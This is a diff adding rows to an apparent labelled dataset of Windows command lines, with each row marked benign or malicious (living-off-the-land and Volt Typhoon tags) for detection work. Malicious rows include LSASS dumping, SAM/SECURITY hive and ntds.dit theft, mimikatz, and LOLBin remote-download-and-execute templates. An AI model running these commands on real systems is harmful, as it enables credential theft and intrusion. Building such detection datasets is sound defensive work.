+"sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice",1,combined_lotl,1193
+"copy.exe ""C:\Windows\Logs\dxdhmumstp.dll"" ""D:\Logs\ufbewg.sys""",0,combined_lotl,1194
+pixtool.exe launch {PATH_ABSOLUTE:.exe},1,combined_lotl,1195
+"rmdir ""C:\Program Files\AppData"" /s /q",0,combined_lotl,1196
+"D:\Windows\dir.exe ""C:\Logs\Users""",0,combined_lotl,1197
+net.exe localgroup Administrators rhxfwsoj /add,0,combined_lotl,1198
+Presentationhost.exe {REMOTEURL},1,combined_lotl,1199
+C:\Program Files (x86)\cmd.exe /c dir C:\Temp,0,combined_lotl,1200
+ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL},1,combined_lotl,1201
+cmd.exe /Q /c *dir 1> \\127.0.0.1\ADMIN$\__1684956600.123456 2>&1,1,combined_lotl,1202
+"C:\Windows\System32\move.exe ""D:\AppData\Windows\mdoxrdp.sys"" ""C:\AppData\bwwxzqr.dll""",0,combined_lotl,1203
+"findstr /C:""5PaR0rAUJw4H"" ""D:\AppData\Logs\uxeoqnt.exe""",0,combined_lotl,1204
+"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}",1,combined_lotl,1205
+echo.exe !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt,1,combined_lotl,1206
+net use Z: \\192.168.114.184\data,0,combined_lotl,1207
+"attrib +h ""D:\Logs\nddefnrnzg.sys""",0,combined_lotl,1208
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Logs\AppData\ficmyzx.dll\"" \""C:\Temp\AppData\ghrcxpqhtv.dll\"""" /sc daily /st 23:00",0,combined_lotl,1209
+"echo GetObject(""script:{REMOTEURL:.js}"") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js",1,combined_lotl,1210
+"copy ""C:\Temp\Temp\bsulbijarm.exe"" ""D:\Temp\Program Files\jdhtmzw.txt""",0,combined_lotl,1211
+Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll,1,combined_lotl,1212
+esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o,1,combined_lotl,1213
+"rmdir.exe ""C:\Windows\Program Files"" /s /q",0,combined_lotl,1214
+"arp.exe -a
+curl.exe www.ip-api[.]com
+dnscmd.exe . /enumrecords /zone {REDACTED}
+dnscmd.exe . /enumzones
+dnscmd.exe /enumrecords {REDACTED} . /additional
+ipconfig.exe /all
+ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
+net.exe localgroup administrators
+net.exe group /dom net.exe group ""Domain Admins"" /dom
+netsh.exe interface firewall show all
+netsh.exe interface portproxy show all
+netsh.exe interface portproxy show v4tov4
+netsh.exe firewall show all
+netsh.exe portproxy show v4tov4
+netstat.exe -ano
+reg.exe query hklm\software\
+systeminfo.exe
+tasklist.exe /v
+whoami.exe
+wmic.exe volume list brief
+wmic.exe service brief
+wmic.exe product list brief
+wmic.exe baseboard list full
+wevtutil.exe qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]",1,volttyphoon,1215
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""list all"" ""delete 1"" ""quit"" ""quit""",1,combined_lotl,1216
+cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat,1,combined_lotl,1217
+net user jpuhhgip /add,0,combined_lotl,1218
+C:\Windows\attrib.exe +r data.log,0,combined_lotl,1219
+attributes volume [{set | clear}] [{hidden | readonly | nodefaultdriveletter | shadowcopy}] [noerr],0,combined_lotl,1220
+"wmic.exe process call create ""cmd.exe /c ntdsutil.exe \""ac i ntds\"" ifm \""create full C:\Windows\Temp\Pro""",1,volttyphoon,1221
+echo.exe UKmxMovtCAWM > C:\AppData\cedxn.ini,0,combined_lotl,1222
+"DefaultPack.EXE /C:""{CMD}""",1,combined_lotl,1223
+chap target set secret=[dtYFbV6kjI6ilFZ5] [initiator=iqn.2025-11.com.example:zzdcklpj],0,combined_lotl,1224
+"C:\Windows\System32\fsutil.exe file layout ""D:\Users\Users\qcwgbrm.sys""",0,combined_lotl,1225
+msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,1,combined_lotl,1226
+"echo %DATE% %TIME% >> ""D:\Users\jdxrcy\Downloads\Documents\ehyscpthyp.log""",0,combined_lotl,1227
+net user sfwsqaux /add,0,combined_lotl,1228
+"del ""C:\Windows\mgushnr.ini"" /f /q",0,combined_lotl,1229
+diskshadow/list/reset,0,combined_lotl,1230
+wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer,1,combined_lotl,1231
+"$DCs = Get-ADDomainController -Filter /$startDate = (get-date).AddDays(-1)/foreach ($DC in $DCs){
+$slogonevents = Get-Eventlog -LogName
+Security -ComputerName $DC.Hostname -
+after $startDate | where {$_.eventID -eq
+4624 }}/foreach ($e in $slogonevents){
+# Logon Successful Events
+# Local (Logon Type 2)
+if (($e.EventID -eq 4624 ) -and
+($e.ReplacementStrings[8] -eq 2)){
+write-host ""Type: Local Logon`tDate:
+""$e.TimeGenerated ""`tStatus:
+Success`tUser: ""$e.ReplacementStrings[5]
+""`tWorkstation: ""$e.ReplacementStrings[11]
+}/if (($e.EventID -eq 4624 ) -and
+($e.ReplacementStrings[8] -eq 10)){
+write-host ""Type: Remote Logon`tDate:
+""$e.TimeGenerated ""`tStatus:
+Success`tUser: ""$e.ReplacementStrings[5]
+""`tWorkstation: ""$e.ReplacementStrings[11]
+""`tIP Address: ""$e.ReplacementStrings[18]
+}}",1,volttyphoon,1232
+net.exe localgroup Administrators inqfovpw /add,0,combined_lotl,1233
+"powershell.exe -Command ""Get-Service""",0,combined_lotl,1234
+"findstr /C:""zxrC0ddHOySf"" ""D:\Users\womof.exe""",0,combined_lotl,1235
+adplus.exe -c {PATH:.xml},1,combined_lotl,1236
+conhost.exe {CMD},1,combined_lotl,1237
+add volume <volume> [provider 5c79240e-eab2-4853-8d13-ba024bcaef27],0,combined_lotl,1238
+"move.exe ""C:\Users\gqzmx\Desktop\Desktop\aifxqhyqz.log"" ""C:\Users\Logs\hnfnvwhtu.dll""",0,combined_lotl,1239
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\qjrtbekx\Pictures\siwocg.txt\"" \""C:\Temp\Logs\orlswmf.txt\"""" /sc daily /st 23:00",0,combined_lotl,1240
+"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""{PATH_ABSOLUTE:.bat}""",1,combined_lotl,1241
+C:\Windows\System32\echo.exe r5zy0mbz1FNw > C:\Users\cbato\Documents\Pictures\ewozzvfad.dat,0,combined_lotl,1242
+"findstr /C:""HV5AVJM2hi9J"" ""D:\Program Files\eqnmb.ini""",0,combined_lotl,1243
+"move ""C:\Users\ektjzkv\Desktop\Desktop\pkiga.sys"" ""C:\Users\lhtpcjpmhq.sys""",0,combined_lotl,1244
+setres.exe -w 800 -h 600,1,combined_lotl,1245
+replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A,1,combined_lotl,1246
+"icacls ""D:\Windows\wdlihtdh.exe"" /grant Everyone:F",0,combined_lotl,1247
+net user awggwrxv /add,0,combined_lotl,1248
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\wzhlbbbo.exe\"" \""D:\Logs\hhjgbj.ini\"""" /sc daily /st 23:00",0,combined_lotl,1249
+"C:\Windows\mkdir.exe ""D:\Logs\Users""",0,combined_lotl,1250
+net user qvcalkrw /add,0,combined_lotl,1251
+"attrib +h ""D:\Logs\swhnsepvn.exe""",0,combined_lotl,1252
+"create lun mirror [size=504] [drives=<n, n> [,...]] [stripesize=504] [noerr]",0,combined_lotl,1253
+"C:\Windows\System32\mkdir.exe ""D:\Users\bstg\Desktop""",0,combined_lotl,1254
+provlaunch.exe LOLBin,1,combined_lotl,1255
+C:\Windows\net.exe user hfzavbmr /add,0,combined_lotl,1256
+fsutil behavior set {allowextchar {1|0} | bugcheckoncorrupt {1|0} | disable8dot3 [ <value> | [D:\Users {1|0}] ] | disablecompression {1|0} | disablecompressionlimit {1|0} | disableencryption {1|0} | disablefilemetadataoptimization {1|0} | disablelastaccess {1|0} | disablespotcorruptionhandling {1|0} | disabletxf {1|0} | disablewriteautotiering {1|0} | encryptpagingfile {1|0} | mftzone <Value> | memoryusage <Value> | quotanotify <frequency> | symlinkevaluation <symboliclinktype> | disabledeletenotify {1|0}}fsutil behavior query disable8dot3 volume{928842df-5a01-11de-a85c-806e6f6e6963},0,combined_lotl,1257
+Pcwrun.exe /../../$(calc).exe,1,combined_lotl,1258
+"certutil -hashfile ""C:\Users\Users\lgcmwkmm.exe"" SHA256",0,combined_lotl,1259
+"findstr.exe /C:""bnFbwzJtTKL7"" ""D:\Windows\Windows\mjfwlbpy.sys""",0,combined_lotl,1260
+findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:<file>] [/c:<string>] [/g:<file>] [/d:<dirlist>] [/a:<colorattribute>] [/off[line]] <strings> [<drive>:][<path>]<filename>[ ...],0,combined_lotl,1261
+Mftrace.exe {PATH:.exe},1,combined_lotl,1262
+fsi.exe,1,combined_lotl,1263
+Vsjitdebugger.exe {PATH:.exe},1,combined_lotl,1264
+echo F8qrdiJcVLPw > C:\AppData\Windows\ojyfldwo.txt,0,combined_lotl,1265
+esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o,1,combined_lotl,1266
+"attrib.exe +h ""D:\Users\ntcim.dat""",0,combined_lotl,1267
+forfiles [/P pathname] [/M searchmask] [/S] [/C command] [/D [+ | -] [{<date> | <days>}]],0,combined_lotl,1268
+echo.exe shcdahIrBh37 > C:\Program Files\Windows\eftlrdyuli.dll,0,combined_lotl,1269
+"copy.exe ""D:\AppData\wmmzz.txt"" ""D:\Logs\AppData\azqeaut.sys""",0,combined_lotl,1270
+C:\Windows\reg.exe query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion,0,combined_lotl,1271
+echo 3vxNFGSCz1EG > C:\Users\Program Files\wierhplla.exe,0,combined_lotl,1272
+diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,1,combined_lotl,1273
+"dir.exe ""C:\Users\nocnclh\Documents"" /s /b",0,combined_lotl,1274
+Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)               Gecko/20100101 Firefox/68.0,1,combined_lotl,1275
+pnputil.exe -i -a {PATH_ABSOLUTE:.inf},1,combined_lotl,1276
+C:\Windows\echo.exe AGA8LNAgy7yV > C:\Logs\Temp\iddlifm.txt,0,combined_lotl,1277
+"msedgewebview2.exe --no-sandbox --browser-subprocess-path=""{PATH_ABSOLUTE:.exe}""",1,combined_lotl,1278
+MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},1,combined_lotl,1279
+"findstr.exe /C:""hrdmZvdiVw2Z"" ""D:\Windows\qlolplwpkz.txt""",0,combined_lotl,1280
+ntsd.exe -g {CMD},1,combined_lotl,1281
+makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,1,combined_lotl,1282
+reset.exe session,1,combined_lotl,1283
+"mkdir.exe ""C:\Users\ubtde\Desktop\Desktop""",0,combined_lotl,1284
+"echo %DATE% %TIME% >> ""C:\Users\AppData\ualcvi.exe""",0,combined_lotl,1285
+echo KNNSUeAKPSv4 > C:\Temp\Program Files\zfmvvins.dat,0,combined_lotl,1286
+squirrel.exe --download {REMOTEURL},1,combined_lotl,1287
+"attrib.exe +h ""C:\Program Files\qperuhcfw.dat""",0,combined_lotl,1288
+"type ""C:\Program Files\iivxvc.log""",0,combined_lotl,1289
+net.exe localgroup Administrators vszseqjf /add,0,combined_lotl,1290
+Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,1,combined_lotl,1291
+"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}",1,combined_lotl,1292
+"wmic.exe process call create ""{CMD}""",1,combined_lotl,1293
+tttracer.exe {PATH_ABSOLUTE:.exe},1,combined_lotl,1294
+"fsutil file layout ""D:\Users\kswqfss\Pictures\Pictures\xpdvxzja.exe""",0,combined_lotl,1295
+"attrib +h ""D:\Program Files\spckyybfj.dat""",0,combined_lotl,1296
+Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe},1,combined_lotl,1297
+"associate controllers [add] 943[,943 [,…]]",0,combined_lotl,1298
+"del ""D:\Logs\gwathbk.ini"" /f /q",0,combined_lotl,1299
+ftp/gpresult.exe /s srvmain /u maindom\hiropln /p p@ssW23 /r,0,volttyphoon,1300
+makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab,1,combined_lotl,1301
+"forfiles /p c:\windows\system32 /m notepad.exe /c ""{PATH_ABSOLUTE}:evil.exe""",1,combined_lotl,1302
+change.exe user,1,combined_lotl,1303
+for /f [usebackq <parsingkeywords>] {%%|%}<variable> in (<set>) do <command> [<commandlineoptions>],0,combined_lotl,1304
+scanline.exe -t 192.168.1.0/24 -p 1-65535,1,volttyphoon,1305
+fsutil.exe 8dot3name [query] [D:\Logs\AppData],0,combined_lotl,1306
+HH.exe {REMOTEURL:.chm},1,combined_lotl,1307
+net localgroup Administrators ubgeaxue /add,0,combined_lotl,1308
+"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",1,combined_lotl,1309
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Users\tphjdy.sys\"" \""C:\Users\Program Files\ztmqpbddeq.log\"""" /sc daily /st 23:00",0,combined_lotl,1310
+"attrib.exe +h ""C:\AppData\Program Files\chjjuty.dll""",0,combined_lotl,1311
+odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},1,combined_lotl,1312
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\AppData\mewizr.txt\"" \""C:\AppData\Logs\fkzjqurm.txt\"""" /sc daily /st 23:00",0,combined_lotl,1313
+"wmic.exe process get brief /format:""{PATH_SMB:.xsl}""",1,combined_lotl,1314
+net.exe use Z: \\192.168.55.46\data,0,combined_lotl,1315
+net localgroup Administrators wshbmwwo /add,0,combined_lotl,1316
+"copy.exe ""D:\Program Files\lpseskai.dll"" ""C:\Windows\zyjbnyd.sys""",0,combined_lotl,1317
+"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",1,combined_lotl,1318
+"findstr /C:""cQgjnTV5VSPx"" ""C:\Temp\dgelssl.exe""",0,combined_lotl,1319
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""D:\Windows\Users\assgzudm.txt\"" \""D:\Users\alnl\Downloads\delpmp.txt\"""" /sc daily /st 23:00",0,combined_lotl,1320
+"certutil.exe -hashfile ""D:\AppData\Users\wxpbwq.txt"" SHA256",0,combined_lotl,1321
+"fsutil.exe file layout ""D:\Users\Program Files\jjeqye.dll""",0,combined_lotl,1322
+setflag drive hotspare={true | false},0,combined_lotl,1323
+"fsutil.exe file layout ""D:\Users\cmsgzs\Downloads\Downloads\ctmjkygokd.dll""",0,combined_lotl,1324
+"dir C:\Users\{REDACTED}\.ssh\known_hosts
+dir C:\users\{REDACTED}\appdata\roaming\Mozilla\firefox\profiles
+mimikatz.exe
+reg query hklm\software\OpenSSH
+reg query hklm\software\OpenSSH\Agent
+reg query hklm\software\realvnc
+reg query hklm\software\realvnc\vncserver
+reg query hklm\software\realvnc\Allusers
+reg query hklm\software\realvnc\Allusers\vncserver
+reg query hkcu\software\{REDACTED}\putty\session
+reg save hklm\sam ss.dat
+reg save hklm\system sy.dat",1,combined_lotl,1325
+ngen.exe {REMOTEURL},1,combined_lotl,1326
+rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full,1,combined_lotl,1327
+ping 192.168.93.18,0,combined_lotl,1328
+"echo.exe %DATE% %TIME% >> ""C:\Windows\Temp\xtrel.txt""",0,combined_lotl,1329
+"del ""C:\Logs\iwyjc.sys"" /f /q",0,combined_lotl,1330
+echo.exe cSZ9y5YffCZe > C:\Logs\suxszn.dll,0,combined_lotl,1331
+"fsutil file layout ""C:\Windows\jlgdts.exe""",0,combined_lotl,1332
+1 provider registered./add volume c: alias System1,0,combined_lotl,1333
+repair disk=4,0,combined_lotl,1334
+"mkdir ""D:\Logs\Logs""",0,combined_lotl,1335
+"findstr.exe /C:""DGzxGMooy0T3"" ""C:\Logs\ldsyu.sys""",0,combined_lotl,1336
+makecab /F {PATH:.ddf},1,combined_lotl,1337
+"wsl.exe --exec bash -c ""{CMD}""",1,combined_lotl,1338
+"echo.exe %DATE% %TIME% >> ""C:\Logs\Windows\wflwa.sys""",0,combined_lotl,1339
+ping.exe 192.168.210.124,0,combined_lotl,1340
+"dir.exe ""C:\Logs"" /s /b",0,combined_lotl,1341
+"fsutil file layout ""D:\Users\zjqnisca\Downloads\xeibo.txt""",0,combined_lotl,1342
+"""cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=""",1,combined_lotl,1343
+C:\Windows\System32\net.exe localgroup Administrators user1 /add,0,combined_lotl,1344
+pktmon.exe start --etw,1,combined_lotl,1345
+net.exe use Z: \\192.168.123.71\backup,0,combined_lotl,1346
+"certutil -hashfile ""D:\Users\Temp\tfvpjsw.ini"" SHA256",0,combined_lotl,1347
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Users\bpvvz\Downloads\Desktop\vxqrgi.dat\"" \""D:\Windows\bjtgbbddq.sys\"""" /sc daily /st 23:00",0,combined_lotl,1348
+"certutil.exe -hashfile ""C:\Program Files\kbadtmw.dll"" SHA256",0,combined_lotl,1349
+"certutil.exe -hashfile ""C:\Windows\ruovke.log"" SHA256",0,combined_lotl,1350
+"move.exe ""D:\Logs\nawhcnss.dll"" ""C:\Temp\lydvjdpvu.txt""",0,combined_lotl,1351
+"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",1,combined_lotl,1352
+cmd.exe /c vssadmin.exe create shadow /for=C: > C:\Windows\Temp\<filename>.tmp cmd.exe /c copy.exe \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit C:\Windows\Temp > C:\Windows\Temp\<filename>.tmp,1,volttyphoon,1353
+"findstr /C:""GvVg8hgmJLLJ"" ""C:\Logs\jjkriq.sys""",0,combined_lotl,1354
+VSDiagnostics.exe start 1 /launch:{PATH:.exe},1,combined_lotl,1355
+@echo off,0,combined_lotl,1356
+repair disk=53 [align=53] [noerr],0,combined_lotl,1357
+echo.exe Yw5CMOKgniNx > C:\AppData\AppData\lofihvepmr.log,0,combined_lotl,1358
+C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL},1,combined_lotl,1359
+"AccCheckConsole.exe -window ""Untitled - Notepad"" {PATH_ABSOLUTE:.dll}",1,combined_lotl,1360
+remove [{letter=E | mount=D:\Users\nqeyqyso\Documents [all]}] [noerr],0,combined_lotl,1361
+"powershell -Command ""Get-ChildItem -Path D:\Program Files\AppData -Recurse | Select-Object FullName, Length""",0,combined_lotl,1362
+net.exe use Z: \\192.168.133.21\data,0,combined_lotl,1363
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""D:\Program Files\Program Files\tgvncjlz.dat\"" \""D:\Users\hhifqz\Downloads\lsmouvf.sys\"""" /sc daily /st 23:00",0,combined_lotl,1364
+"E:\Windows\powershell.exe -Command ""Get-ChildItem -Path C:\Program Files\Program Files -Recurse | Select-Object FullName, Length""",0,combined_lotl,1365
+"dir.exe ""C:\Users\hfihnso\Downloads\Pictures""",0,combined_lotl,1366
+"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",1,combined_lotl,1367
+net.exe user chxndonm /add,0,combined_lotl,1368
+"E:\Windows\System32\attrib.exe +h ""D:\Users\eoge\Downloads\ykccw.dll""",0,combined_lotl,1369
+"copy ""D:\Users\mmwkj.log"" ""C:\Users\maey\Pictures\cchivrpb.sys""",0,combined_lotl,1370
+"attrib.exe +h ""D:\Users\rmrvbklb.ini""",0,combined_lotl,1371
+"arp -a
+curl www.ip-api[.]com
+dnscmd . /enumrecords /zone {REDACTED}
+dnscmd . /enumzones
+dnscmd /enumrecords {REDACTED} . /additional
+ipconfig /all
+ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
+net localgroup administrators
+net group /dom net group ""Domain Admins"" /dom
+netsh interface firewall show all
+netsh interface portproxy show all
+netsh interface portproxy show v4tov4
+netsh firewall show all
+netsh portproxy show v4tov4
+netstat -ano
+reg query hklm\software\
+systeminfo
+tasklist /v
+whoami
+wmic volume list brief
+wmic service brief
+wmic product list brief
+wmic baseboard list full
+wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]
+",1,combined_lotl,1372
+"dsdbutil.exe ""activate instance ntds"" ""snapshot"" ""create"" ""quit"" ""quit""",1,combined_lotl,1373
+net use Z: \\192.168.42.219\public,0,combined_lotl,1374
+msxsl.exe {PATH:.xml} {PATH:.xsl},1,combined_lotl,1375
+bcdedit /enum all,0,combined_lotl,1376
+"findstr /C:""VRbHgmO2LqHO"" ""D:\Program Files\Logs\mcmyppfszu.exe""",0,combined_lotl,1377
+"copy.exe ""D:\Logs\oegzl.ini"" ""C:\Users\alqnwb\Pictures\smapioaqcp.ini""",0,combined_lotl,1378
+assign e:,0,combined_lotl,1379
+net.exe localgroup Administrators snlyeonb /add,0,combined_lotl,1380
+net user qsxxqyom /add,0,combined_lotl,1381
+C:\Windows\System32\echo.exe GmyTfq6NxcxU > C:\Users\dgve\Documents\Desktop\cfipfzwg.dll,0,combined_lotl,1382
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Windows\lxjgn.exe\"" \""C:\Windows\mgeygl.txt\"""" /sc daily /st 23:00",0,combined_lotl,1383
+reg.exe save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak},1,combined_lotl,1384
+"C:\Windows\fsutil.exe file layout ""D:\Users\rmqc\Downloads\ozgcpfu.log""",0,combined_lotl,1385
+ilasm.exe {PATH_ABSOLUTE:.txt} /exe,1,combined_lotl,1386
+msdeploy.exe -verb:sync -source:filePath={PATH_ABSOLUTE:.source.ext} -dest:filePath={PATH_ABSOLUTE:.dest.ext},1,combined_lotl,1387
+Visio.exe {REMOTEURL},1,combined_lotl,1388
+"C:\Windows\System32\type.exe ""C:\Users\fwyfc\Documents\Desktop\axtghzkgo.txt""",0,combined_lotl,1389
+net.exe user guest /add,0,combined_lotl,1390
+net.exe user xofhbcnm /add,0,combined_lotl,1391
+"fsutil file layout ""C:\Users\kjmmyfgit.exe""",0,combined_lotl,1392
+fsianycpu.exe {PATH:.fsscript},1,combined_lotl,1393
+regsvr32.exe /u /s {PATH:.dll},1,combined_lotl,1394
+Rem eB4aNFwRc7N8iw7SqAUV,0,combined_lotl,1395
+msedge.exe {REMOTEURL:.exe.txt},1,combined_lotl,1396
+"certutil -hashfile ""C:\Temp\Temp\tspuzgmuie.exe"" SHA256",0,combined_lotl,1397
+net.exe user fhvqnsuq /add,0,combined_lotl,1398
+control.exe {PATH_ABSOLUTE:.cpl},1,combined_lotl,1399
+net.exe user ighnbktf /add,0,combined_lotl,1400
+echo.exe tyyKFgvu2Cls > D:\Users\Logs\apckui.ini,0,combined_lotl,1401
+echo.exe dIo6R1MuhGGd > D:\Users\Windows\viyosks.dat,0,combined_lotl,1402
+"copy.exe ""C:\Program Files\eczvnfbznz.txt"" ""D:\Temp\Program Files\yjdmp.log""",0,combined_lotl,1403
+net.exe user qnzftmln /add,0,combined_lotl,1404
+net.exe use Z: \\192.168.164.172\backup,0,combined_lotl,1405
+ac i ntds i,1,combined_lotl,1406
+"attrib.exe +h ""C:\Users\efelwt.txt""",0,combined_lotl,1407
+fondue.exe /enable-feature:NETFX4 /caller-name:Admin.bat /hide-ux:all,0,combined_lotl,1408
+"findstr /C:""xAKswkgQapQC"" ""D:\Windows\aqsthgk.dat""",0,combined_lotl,1409
+net.exe use Z: \\192.168.214.104\data,0,combined_lotl,1410
+"rundll32.exe {PATH_SMB:.dll},EntryPoint",1,combined_lotl,1411
+net use Z: \\192.168.85.90\data,0,combined_lotl,1412
+createdump.exe -n -f {PATH:.dmp} {PID},1,combined_lotl,1413
+net.exe user ecvhffam /add,0,combined_lotl,1414
+DeviceCredentialDeployment,1,combined_lotl,1415
+"icacls ""C:\Logs\Windows\pqxbvrda.exe"" /grant Everyone:F",0,combined_lotl,1416
+C:\Windows\System32\ping.exe 192.168.32.119,0,combined_lotl,1417
+"fsutil.exe devdrv setFiltersAllowed [[/f] /volume C:\Users\ypmsbjj\Pictures] """"filter1, filter 2, ...""""",0,combined_lotl,1418
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy \""C:\Temp\Temp\beung.dll\"" \""C:\Users\Program Files\qylxa.log\"""" /sc daily /st 23:00",0,combined_lotl,1419
+"icacls ""C:\Users\ajmcc\Downloads\Documents\ixjylddyor.exe"" /grant Everyone:F",0,combined_lotl,1420
+"C:\Windows\fsutil.exe file layout ""C:\AppData\kfcnrkrot.dat""",0,combined_lotl,1421
+msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name,1,combined_lotl,1422
+"C:\Windows\System32\move.exe ""C:\Program Files\Logs\cuchhxs.sys"" ""D:\Windows\Temp\bkbelhv.sys""",0,combined_lotl,1423
+"type.exe ""D:\Users\vjbhbf\Documents\tfqxojxg.dat""",0,combined_lotl,1424
+cmd.exe /c dir C:\Temp,0,combined_lotl,1425
+fsutil devdrv query [<volume path>],0,combined_lotl,1426
+"schtasks /create /tn ""My Daily Backup"" /tr ""copy.exe \""C:\Temp\Temp\urqrvrr.log\"" \""C:\Users\exweblbx.sys\"""" /sc daily /st 23:00",0,combined_lotl,1427
+WorkFolders,1,combined_lotl,1428
+"certutil -hashfile ""D:\Temp\bzjha.log"" SHA256",0,combined_lotl,1429
+"C:\{redacted}\
+logins.ps1",1,combined_lotl,1430
+"C:\Windows\certutil.exe -hashfile ""C:\AppData\zaatv.ini"" SHA256",0,combined_lotl,1431
+"move.exe ""D:\Logs\bjyimq.log"" ""D:\Windows\Program Files\qkoslguqwi.ini""",0,combined_lotl,1432
+"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}",1,combined_lotl,1433
+"echo.exe %DATE% %TIME% >> ""C:\Users\tbfdkv\Downloads\Documents\hjgiz.txt""",0,combined_lotl,1434
+net.exe localgroup Administrators thdoeoao /add,0,combined_lotl,1435
+net.exe use Z: \\192.168.193.121\data,0,combined_lotl,1436
+"type.exe ""D:\Program Files\nawmwp.dat""",0,combined_lotl,1437
+certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe},1,combined_lotl,1438
+"move.exe ""C:\Windows\khgoqksn.sys"" ""D:\Users\AppData\kbnlnmpqnq.sys""",0,combined_lotl,1439
+net.exe use Z: \\192.168.231.139\public,0,combined_lotl,1440
+dotnet.exe fsi,1,combined_lotl,1441
+ProtocolHandler.exe {REMOTEURL},1,combined_lotl,1442
+ping.exe 192.168.35.29,0,combined_lotl,1443
+net.exe user tsmfetjo /add,0,combined_lotl,1444
+psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0,1,combined_lotl,1445
+net.exe localgroup Administrators gccsibvu /add,0,combined_lotl,1446
+net.exe localgroup Administrators xhkouxvd /add,0,combined_lotl,1447
+pcalua.exe -a {PATH_SMB:.dll},1,combined_lotl,1448
+rcsi.exe {PATH:.csx},1,combined_lotl,1449
+msbuild.exe {PATH:.xml},1,combined_lotl,1450
+xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},1,combined_lotl,1451
+net use Z: \\192.168.74.29\data,0,combined_lotl,1452
+"rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}",1,combined_lotl,1453
